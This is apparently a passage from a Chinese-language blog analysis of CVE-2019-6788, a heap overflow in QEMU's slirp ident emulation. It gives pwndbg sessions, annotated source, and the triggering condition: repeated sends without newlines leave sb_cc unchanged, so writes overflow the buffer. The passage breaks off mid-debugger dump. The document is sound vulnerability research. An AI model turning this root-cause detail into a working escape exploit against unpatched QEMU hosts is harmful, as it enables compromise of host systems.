&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxa1n@Qemu:~/CVE-2019-6788$ sudo nc -lvnp 113
[sudo] password for wnagzihxa1n: 
Listening on [0.0.0.0] (family 0, port 113)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行Poc，宿主机成功收到数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Listening on [0.0.0.0] (family 0, port 113)
Connection from [127.0.0.1] port 113 [tcp/*] accepted (family 2, sport 45840)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同时可以捕获到崩溃&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2A8191B3ABAFFB7D97F0C56A234DF693.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果使用断点，断点现场如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file ./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
b tcp_emu
run -kernel ./Kernel/linux-5.2.11/arch/x86/boot/bzImage -append &quot;console=ttyS0 root=/dev/sda rw&quot; -hda ./rootfs.img -m 2G -nographic -L ./pc-bios -smp 1 -net user,hostfwd=tcp::6788-:22 -net nic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EDF9EF37CB1D21AFB02E050C1E89AC7B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;调用栈&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ► f 0     555555c14552 tcp_emu+28
   f 1     555555c10a2f tcp_input+3186
   f 2     555555c077e5 ip_input+710
   f 3     555555c0ac85 slirp_input+412
   f 4     555555bf2f80 net_slirp_receive+83
   f 5     555555be8a36 nc_sendv_compat+254
   f 6     555555be8af8 qemu_deliver_packet_iov+172
   f 7     555555beb5d5 qemu_net_queue_deliver_iov+80
   f 8     555555beb744 qemu_net_queue_send_iov+134
   f 9     555555be8c3d qemu_sendv_packet_async+289
   f 10     555555be8c6a qemu_sendv_packet+43
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据大佬们的文章，在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_emu()&lt;/code&gt;下断点，我们来看断点现场&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# ./crash_poc 
[Switching to Thread 0x7fffd5480700 (LWP 6110)]

Thread 4 &quot;qemu-system-x86&quot; hit Breakpoint 1, tcp_emu (so=0x7fffd29be200, m=0x5555579f1d00) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c:612
612	{
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────
 RAX  0x7fffd29be200 —▸ 0x555556830220 —▸ 0x55555682e170 ◂— 0x7fffd29be200
 RBX  0x7fffd2a10110 ◂— 0x7fffd2a10110
 RCX  0x2238
 RDX  0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 —▸ 0x55555682e068 ◂— ...
 RDI  0x7fffd29be200 —▸ 0x555556830220 —▸ 0x55555682e170 ◂— 0x7fffd29be200
 RSI  0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 —▸ 0x55555682e068 ◂— ...
 R8   0x5555579f1d7e ◂— 0x6000202
 R9   0x0
 R10  0x5555579f1d7e ◂— 0x6000202
 R11  0x2
 R12  0x5555579f1d70 ◂— 0x0
 R13  0x18
 R14  0x55555684c6d0 ◂— 0xffffb20740523818
 R15  0x0
 RBP  0x7fffd547e950 —▸ 0x7fffd547eba0 —▸ 0x7fffd547ebf0 —▸ 0x7fffd547ec30 —▸ 0x7fffd547ec80 ◂— ...
 RSP  0x7fffd547e7c0 —▸ 0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 ◂— ...
 RIP  0x555555c14552 (tcp_emu+28) ◂— mov    rax, qword ptr fs:[0x28]
──────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────
 ► 0x555555c14552 &amp;lt;tcp_emu+28&amp;gt;    mov    rax, qword ptr fs:[0x28]
   0x555555c1455b &amp;lt;tcp_emu+37&amp;gt;    mov    qword ptr [rbp - 0x18], rax
   0x555555c1455f &amp;lt;tcp_emu+41&amp;gt;    xor    eax, eax
   0x555555c14561 &amp;lt;tcp_emu+43&amp;gt;    mov    rax, qword ptr [rbp - 0x188]
   0x555555c14568 &amp;lt;tcp_emu+50&amp;gt;    mov    rax, qword ptr [rax + 0x18]
   0x555555c1456c &amp;lt;tcp_emu+54&amp;gt;    mov    qword ptr [rbp - 0x140], rax
   0x555555c14573 &amp;lt;tcp_emu+61&amp;gt;    mov    rax, qword ptr [rbp - 0x188]
   0x555555c1457a &amp;lt;tcp_emu+68&amp;gt;    movzx  eax, byte ptr [rax + 0x139]
   0x555555c14581 &amp;lt;tcp_emu+75&amp;gt;    movzx  eax, al
   0x555555c14584 &amp;lt;tcp_emu+78&amp;gt;    cmp    eax, 7
   0x555555c14587 &amp;lt;tcp_emu+81&amp;gt;    ja     tcp_emu+4533 &amp;lt;0x555555c156eb&amp;gt;
──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
   607  *
   608  * NOTE: if you return 0 you MUST m_free() the mbuf!
   609  */
   610 int
   611 tcp_emu(struct socket *so, struct mbuf *m)
 ► 612 {
   613 	Slirp *slirp = so-&amp;gt;slirp;
   614 	u_int n1, n2, n3, n4, n5, n6;
   615         char buff[257];
   616 	uint32_t laddr;
   617 	u_int lport;
──────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffd547e7c0 —▸ 0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 ◂— ...
01:0008│      0x7fffd547e7c8 —▸ 0x7fffd29be200 —▸ 0x555556830220 —▸ 0x55555682e170 ◂— 0x7fffd29be200
02:0010│      0x7fffd547e7d0 —▸ 0x7fffd547e9f0 —▸ 0x7fffd547ea60 ◂— 0xf02000afccf0002
03:0018│      0x7fffd547e7d8 ◂— 0x1
04:0020│      0x7fffd547e7e0 —▸ 0x555556829990 —▸ 0x5555566deb40 (net_hub_port_info) ◂— 0x8
05:0028│      0x7fffd547e7e8 —▸ 0x5555576ac4e0 —▸ 0x5555576ac360 —▸ 0x555556651ec0 (net_e1000_info) ◂— 0x1
06:0030│      0x7fffd547e7f0 ◂— 0x4620000a312e312e /* '.1.1\n' */
07:0038│      0x7fffd547e7f8 ◂— 0x40 /* '@' */
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────
 ► f 0     555555c14552 tcp_emu+28
   f 1     555555c10a2f tcp_input+3186
   f 2     555555c077e5 ip_input+710
   f 3     555555c0ac85 slirp_input+412
   f 4     555555bf2f80 net_slirp_receive+83
   f 5     555555be8a36 nc_sendv_compat+254
   f 6     555555be8af8 qemu_deliver_packet_iov+172
   f 7     555555beb5d5 qemu_net_queue_deliver_iov+80
   f 8     555555beb744 qemu_net_queue_send_iov+134
   f 9     555555be8c3d qemu_sendv_packet_async+289
   f 10     555555be8c6a qemu_sendv_packet+43
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对应的函数如下，我简单做了一些改动，但是函数逻辑没变化&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int tcp_emu(struct socket *so, struct mbuf *m)
{
    Slirp *slirp = so-&amp;gt;slirp;
	u_int n1, n2, n3, n4, n5, n6;

	switch(so-&amp;gt;so_emu) {
		int x, i;

	    case EMU_IDENT:
    		/*
    		 * Identification protocol as per rfc-1413
    		 */
    		{
    			struct socket *tmpso;
    			struct sockaddr_in addr;
    			socklen_t addrlen = sizeof(struct sockaddr_in);
    			struct sbuf *so_rcv = &amp;amp;so-&amp;gt;so_rcv;
    
    			memcpy(so_rcv-&amp;gt;sb_wptr, m-&amp;gt;m_data, m-&amp;gt;m_len);
    			so_rcv-&amp;gt;sb_wptr += m-&amp;gt;m_len;
    			so_rcv-&amp;gt;sb_rptr += m-&amp;gt;m_len;
    			m-&amp;gt;m_data[m-&amp;gt;m_len] = 0; /* NULL terminate */
    			if (strchr(m-&amp;gt;m_data, '\r') || strchr(m-&amp;gt;m_data, '\n')) {
    				if (sscanf(so_rcv-&amp;gt;sb_data, &quot;%u%*[ ,]%u&quot;, &amp;amp;n1, &amp;amp;n2) == 2) {
    					HTONS(n1);
    					HTONS(n2);
    					/* n2 is the one on our host */
    					for (tmpso = slirp-&amp;gt;tcb.so_next;
    					     tmpso != &amp;amp;slirp-&amp;gt;tcb;
    					     tmpso = tmpso-&amp;gt;so_next) {
    						if (tmpso-&amp;gt;so_laddr.s_addr == so-&amp;gt;so_laddr.s_addr &amp;amp;&amp;amp;
    						    tmpso-&amp;gt;so_lport == n2 &amp;amp;&amp;amp;
    						    tmpso-&amp;gt;so_faddr.s_addr == so-&amp;gt;so_faddr.s_addr &amp;amp;&amp;amp;
    						    tmpso-&amp;gt;so_fport == n1) {
    							if (getsockname(tmpso-&amp;gt;s,
    								(struct sockaddr *)&amp;amp;addr, &amp;amp;addrlen) == 0)
    							   n2 = ntohs(addr.sin_port);
    							break;
    						}
    					}
    				}
                    so_rcv-&amp;gt;sb_cc = snprintf(so_rcv-&amp;gt;sb_data, so_rcv-&amp;gt;sb_datalen, &quot;%d,%d\r\n&quot;, n1, n2);
    				so_rcv-&amp;gt;sb_rptr = so_rcv-&amp;gt;sb_data;
    				so_rcv-&amp;gt;sb_wptr = so_rcv-&amp;gt;sb_data + so_rcv-&amp;gt;sb_cc;
    			}
    			m_free(m);
    			return 0;
    		}

    case EMU_FTP: /* ftp */
            ...

	case EMU_IRC:
	    ...
	    
	case EMU_REALAUDIO:
	    ...
	
	default:
		/* Ooops, not emulated, won't call tcp_emu again */
		so-&amp;gt;so_emu = 0;
		return 1;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时函数执行到入口，查看两个参数，第一个参数是结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct socket *so&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwndbg&amp;gt; print *so
$3 = {
  so_next = 0x555556830220, 
  so_prev = 0x55555682e170, 
  s = 15, 
  pollfds_idx = 0, 
  slirp = 0x55555682dfc0, 
  so_m = 0x0, 
  so_ti = 0x5555579f1d70, 
  so_urgc = 0, 
  fhost = {
    ...
  }, 
  lhost = {
    ...
  }, 
  so_iptos = 16 '\020', 
  so_emu = 7 '\a', 
  so_type = 0 '\000', 
  so_state = 4, 
  so_tcpcb = 0x7fffd2a10110, 
  so_expire = 0, 
  so_queued = 0, 
  so_nqueued = 0, 
  so_rcv = {
    sb_cc = 0, 
    sb_datalen = 8760, 
    sb_wptr = 0x7fffd2d29cc0 &quot;H\b&quot;, 
    sb_rptr = 0x7fffd2d29cc0 &quot;H\b&quot;, 
    sb_data = 0x7fffd2d29cc0 &quot;H\b&quot;
  }, 
  so_snd = {
    sb_cc = 0, 
    sb_datalen = 8760, 
    sb_wptr = 0x7fffd2d27a80 &quot;H\b&quot;, 
    sb_rptr = 0x7fffd2d27a80 &quot;H\b&quot;, 
    sb_data = 0x7fffd2d27a80 &quot;H\b&quot;
  }, 
  extra = 0x0
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到第二个参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mbuf *m&lt;/code&gt;的数据就是传入的一大堆&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwndbg&amp;gt; print *m
$4 = {
  m_next = 0x5555579ff000, 
  m_prev = 0x55555682e068, 
  m_nextpkt = 0x0, 
  m_prevpkt = 0x0, 
  m_flags = 4, 
  m_size = 1544, 
  m_so = 0x7fffd29be200, 
  m_data = 0x5555579f1db4 'A' &amp;lt;repeats 200 times&amp;gt;..., 
  m_len = 1280, 
  slirp = 0x55555682dfc0, 
  resolution_requested = false, 
  expiration_date = 18446744073709551615, 
  m_ext = 0x0, 
  m_dat = 0x5555579f1d60 &quot;&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;有了入口数据，我们来跟一遍代码，最后会发现，先拷贝了数据，当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m-&amp;gt;m_data&lt;/code&gt;里不存在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\r&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;的时候，就不更新&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so_rcv-&amp;gt;sb_cc&lt;/code&gt;，这一点很重要&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
	struct socket *tmpso;
	struct sockaddr_in addr;
	socklen_t addrlen = sizeof(struct sockaddr_in);
	// 获取so-&amp;gt;so_rcv结构体，sbuf这个结构体用于保存来自TCP层的数据
	struct sbuf *so_rcv = &amp;amp;so-&amp;gt;so_rcv;

    // 将m-&amp;gt;m_data数据写入so_rcv-&amp;gt;sb_wptr，m对应的结构体是mbuf，用于保存来自IP层的数据
	memcpy(so_rcv-&amp;gt;sb_wptr, m-&amp;gt;m_data, m-&amp;gt;m_len);
	
	// 移动读写指针
	so_rcv-&amp;gt;sb_wptr += m-&amp;gt;m_len;
	so_rcv-&amp;gt;sb_rptr += m-&amp;gt;m_len;
	
	// 末尾置空截断
	m-&amp;gt;m_data[m-&amp;gt;m_len] = 0; /* NULL terminate */
	
	// 漏洞出现在这里
	// 使用`strchr()`搜索，当m-&amp;gt;m_data里不存在`\r`和`\n`的时候，返回NULL，就不会进入这个if
	if (strchr(m-&amp;gt;m_data, '\r') || strchr(m-&amp;gt;m_data, '\n')) {
		if (sscanf(so_rcv-&amp;gt;sb_data, &quot;%u%*[ ,]%u&quot;, &amp;amp;n1, &amp;amp;n2) == 2) {
			HTONS(n1);
			HTONS(n2);
			/* n2 is the one on our host */
			for (tmpso = slirp-&amp;gt;tcb.so_next;
			     tmpso != &amp;amp;slirp-&amp;gt;tcb;
			     tmpso = tmpso-&amp;gt;so_next) {
				if (tmpso-&amp;gt;so_laddr.s_addr == so-&amp;gt;so_laddr.s_addr &amp;amp;&amp;amp;
				    tmpso-&amp;gt;so_lport == n2 &amp;amp;&amp;amp;
				    tmpso-&amp;gt;so_faddr.s_addr == so-&amp;gt;so_faddr.s_addr &amp;amp;&amp;amp;
				    tmpso-&amp;gt;so_fport == n1) {
					if (getsockname(tmpso-&amp;gt;s, (struct sockaddr *)&amp;amp;addr, &amp;amp;addrlen) == 0)
					   n2 = ntohs(addr.sin_port);
					break;
				}
			}
		}
		
		// so_rcv-&amp;gt;sb_cc的值只有这里会更新
        so_rcv-&amp;gt;sb_cc = snprintf(so_rcv-&amp;gt;sb_data, so_rcv-&amp;gt;sb_datalen, &quot;%d,%d\r\n&quot;, n1, n2);
		so_rcv-&amp;gt;sb_rptr = so_rcv-&amp;gt;sb_data;
		so_rcv-&amp;gt;sb_wptr = so_rcv-&amp;gt;sb_data + so_rcv-&amp;gt;sb_cc;
	}
	m_free(m);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;查看结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbuf&lt;/code&gt;的定义可知，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so_rcv-&amp;gt;sb_cc&lt;/code&gt;就是缓冲区中的字符数量&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sbuf {
	uint32_t sb_cc;		/* actual chars in buffer */
	uint32_t sb_datalen;	/* Length of data  */
	char	*sb_wptr;	/* write pointer. points to where the next
				 * bytes should be written in the sbuf */
	char	*sb_rptr;	/* read pointer. points to where the next
				 * byte should be read from the sbuf */
	char	*sb_data;	/* Actual data */
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来看调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_emu()&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_input()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;} else if (ti-&amp;gt;ti_ack == tp-&amp;gt;snd_una &amp;amp;&amp;amp; tcpfrag_list_empty(tp) &amp;amp;&amp;amp; ti-&amp;gt;ti_len &amp;lt;= sbspace(&amp;amp;so-&amp;gt;so_rcv)) {
	/*
	 * this is a pure, in-sequence data packet
	 * with nothing on the reassembly queue and
	 * we have enough buffer space to take it.
	 */
	tp-&amp;gt;rcv_nxt += ti-&amp;gt;ti_len;
	/*
	 * Add data to socket buffer.
	 * 把数据添加到缓冲区
	 */
	if (so-&amp;gt;so_emu) {
		if (tcp_emu(so,m)) sbappend(so, m);
	} else
		sbappend(so, m);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第三个判断是长度，我们来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbspace()&lt;/code&gt;的定义，结合这个定义可以理解这里是在说IP包的长度要小于缓冲区剩余空间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define sbspace(sb) ((sb)-&amp;gt;sb_datalen - (sb)-&amp;gt;sb_cc)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;静态分析就是这么个情况，我们来动态跑一下&lt;/p&gt;

&lt;p&gt;拷贝前先看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so_rcv&lt;/code&gt;的数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
   633 			struct socket *tmpso;
   634 			struct sockaddr_in addr;
   635 			socklen_t addrlen = sizeof(struct sockaddr_in);
   636 			struct sbuf *so_rcv = &amp;amp;so-&amp;gt;so_rcv;
   637 
 ► 638 			memcpy(so_rcv-&amp;gt;sb_wptr, m-&amp;gt;m_data, m-&amp;gt;m_len);
   639 			so_rcv-&amp;gt;sb_wptr += m-&amp;gt;m_len;
   640 			so_rcv-&amp;gt;sb_rptr += m-&amp;gt;m_len;
   641 			m-&amp;gt;m_data[m-&amp;gt;m_len] = 0; /* NULL terminate */
   642 			if (strchr(m-&amp;gt;m_data, '\r') || strchr(m-&amp;gt;m_data, '\n')) {
   643 				if (sscanf(so_rcv-&amp;gt;sb_data, &quot;%u%*[ ,]%u&quot;, &amp;amp;n1, &amp;amp;n2) == 2) {

pwndbg&amp;gt; print *so_rcv
$6 = {
  sb_cc = 0, 
  sb_datalen = 8760, 
  sb_wptr = 0x7fffd2d29cc0 &quot;H\b&quot;, 
  sb_rptr = 0x7fffd2d29cc0 &quot;H\b&quot;, 
  sb_data = 0x7fffd2d29cc0 &quot;H\b&quot;
}
pwndbg&amp;gt; x/16gx 0x7fffd2d29cc0
0x7fffd2d29cc0:	0x00007fffd0000848	0x00007fffd3bdaff0
0x7fffd2d29cd0:	0x00007fffd3bdaff0	0x00007fffd3bdaff0
0x7fffd2d29ce0:	0x0000000000000000	0x0000000000000000
0x7fffd2d29cf0:	0x0000000000000000	0x0000000000000000
0x7fffd2d29d00:	0x0000000000000000	0x0000000000000000
0x7fffd2d29d10:	0x0000000000000000	0x0000000000000000
0x7fffd2d29d20:	0x0000000000000000	0x0000000000000000
0x7fffd2d29d30:	0x0000000000000000	0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;拷贝完成之后，已经可以看到数据写入了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
   634 			struct sockaddr_in addr;
   635 			socklen_t addrlen = sizeof(struct sockaddr_in);
   636 			struct sbuf *so_rcv = &amp;amp;so-&amp;gt;so_rcv;
   637 
   638 			memcpy(so_rcv-&amp;gt;sb_wptr, m-&amp;gt;m_data, m-&amp;gt;m_len);
 ► 639 			so_rcv-&amp;gt;sb_wptr += m-&amp;gt;m_len;
   640 			so_rcv-&amp;gt;sb_rptr += m-&amp;gt;m_len;
   641 			m-&amp;gt;m_data[m-&amp;gt;m_len] = 0; /* NULL terminate */
   642 			if (strchr(m-&amp;gt;m_data, '\r') || strchr(m-&amp;gt;m_data, '\n')) {
   643 				if (sscanf(so_rcv-&amp;gt;sb_data, &quot;%u%*[ ,]%u&quot;, &amp;amp;n1, &amp;amp;n2) == 2) {
   644 					HTONS(n1);

pwndbg&amp;gt; print *so_rcv
$7 = {
  sb_cc = 0, 
  sb_datalen = 8760, 
  sb_wptr = 0x7fffd2d29cc0 'A' &amp;lt;repeats 200 times&amp;gt;..., 
  sb_rptr = 0x7fffd2d29cc0 'A' &amp;lt;repeats 200 times&amp;gt;..., 
  sb_data = 0x7fffd2d29cc0 'A' &amp;lt;repeats 200 times&amp;gt;...
}
pwndbg&amp;gt; x/16gx 0x7fffd2d29cc0
0x7fffd2d29cc0:	0x4141414141414141	0x4141414141414141
0x7fffd2d29cd0:	0x4141414141414141	0x4141414141414141
0x7fffd2d29ce0:	0x4141414141414141	0x4141414141414141
0x7fffd2d29cf0:	0x4141414141414141	0x4141414141414141
0x7fffd2d29d00:	0x4141414141414141	0x4141414141414141
0x7fffd2d29d10:	0x4141414141414141	0x4141414141414141
0x7fffd2d29d20:	0x4141414141414141	0x4141414141414141
0x7fffd2d29d30:	0x4141414141414141	0x4141414141414141
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;后面就是没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\r&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;，进不了if去修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so_rcv-&amp;gt;sb_cc&lt;/code&gt;，单步一下毫无悬念的被跳过了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
   662                                                          so_rcv-&amp;gt;sb_datalen,
   663                                                          &quot;%d,%d\r\n&quot;, n1, n2);
   664 				so_rcv-&amp;gt;sb_rptr = so_rcv-&amp;gt;sb_data;
   665 				so_rcv-&amp;gt;sb_wptr = so_rcv-&amp;gt;sb_data + so_rcv-&amp;gt;sb_cc;
   666 			}
 ► 667 			m_free(m);
   668 			return 0;
   669 		}
   670 
   671         case EMU_FTP: /* ftp */
   672                 *(m-&amp;gt;m_data+m-&amp;gt;m_len) = 0; /* NUL terminate for strstr */
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;离开&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_emu()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
   937 	 default:
   938 		/* Ooops, not emulated, won't call tcp_emu again */
   939 		so-&amp;gt;so_emu = 0;
   940 		return 1;
   941 	}
 ► 942 }
   943 
   944 /*
   945  * Do misc. config of SLiRP while its running.
   946  * Return 0 if this connections is to be closed, 1 otherwise,
   947  * return 2 if this is a command-line connection
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;回到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_input()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_input.c
   578 			 *	he gets an ACK.
   579 			 *
   580 			 * It is better to not delay acks at all to maximize
   581 			 * TCP throughput.  See RFC 2581.
   582 			 */
 ► 583 			tp-&amp;gt;t_flags |= TF_ACKNOW;
   584 			tcp_output(tp);
   585 			return;
   586 		}
   587 	} /* header prediction */
   588 	/*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_input()&lt;/code&gt;挺大的，我们看关键的判断点，因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so_rcv-&amp;gt;sb_cc&lt;/code&gt;没有被更新，所以可以继续写入数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;} else if (ti-&amp;gt;ti_ack == tp-&amp;gt;snd_una 
            &amp;amp;&amp;amp; tcpfrag_list_empty(tp) 
            &amp;amp;&amp;amp; ti-&amp;gt;ti_len &amp;lt;= sbspace(&amp;amp;so-&amp;gt;so_rcv)) {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们的Poc是循环发送数据，刚才走完了第一轮，接下来进行第二轮&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
   607  *
   608  * NOTE: if you return 0 you MUST m_free() the mbuf!
   609  */
   610 int
   611 tcp_emu(struct socket *so, struct mbuf *m)
 ► 612 {
   613 	Slirp *slirp = so-&amp;gt;slirp;
   614 	u_int n1, n2, n3, n4, n5, n6;
   615         char buff[257];
   616 	uint32_t laddr;
   617 	u_int lport;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so-&amp;gt;so_rcv&lt;/code&gt;，此时的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sb_wptr&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sb_rptr&lt;/code&gt;已经指向的是添加了第一轮数据之后的位置，但是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sb_cc&lt;/code&gt;却没有更新，那么如果我们一直发数据，就会一直写，并且等于没有长度校验，最终就会溢出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwndbg&amp;gt; print so-&amp;gt;so_rcv
$9 = {
  sb_cc = 0, 
  sb_datalen = 8760, 
